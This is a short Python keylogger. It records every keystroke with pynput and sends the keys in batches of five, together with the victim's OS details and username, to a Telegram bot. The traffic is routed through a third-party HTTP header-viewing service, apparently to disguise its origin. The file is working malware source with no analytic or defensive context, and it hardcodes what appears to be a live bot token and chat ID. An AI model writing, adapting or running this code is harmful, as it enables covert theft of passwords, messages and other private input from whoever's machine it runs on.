from pynput import keyboard
import requests,platform,os
import getpass

list = []

tokn = TOKEN
user = USERINFO

def target_platform():

    target = ("Connected!\n"+"Os Name : "+platform.uname()[0]+"|"+"Version : "+platform.uname()[2]+"|"+"Username : "+getpass.getuser())
    
    url_platform = (f"https://api.telegram.org/bot{tokn}/sendmessage?chat_id={user}&text="+str(target))

    payload_platform = {"UrlBox":url_platform,

            "AgentList":"Mozilla Firefox",
            "VersionsList":"HTTP/1.1",
            "MethodList":"POST"
        }

    req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload_platform)

def key_start():
    with keyboard.Listener(on_press=key_log) as listn:
        listn.join()

def key_log(key):
    if type(key) == keyboard._xorg.KeyCode:
        key = key.char
    
    key = str(key)
    list.append(key)

    if len(list) == 5:
        send_msg(str(list))
        list.clear()

    print(type(key))
def send_msg(data):

    url_key = ("https://api.telegram.org/bot5525348770:AAHD6lAHU18twC61ggwSoYM8mMyOhGgXLqc/sendmessage?chat_id=586205272&text="+data)

    payload_key = {"UrlBox":url_key,

            "AgentList":"Mozilla Firefox",
            "VersionsList":"HTTP/1.1",
            "MethodList":"POST"
        }

    req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload_key)
    
target_platform()
key_start()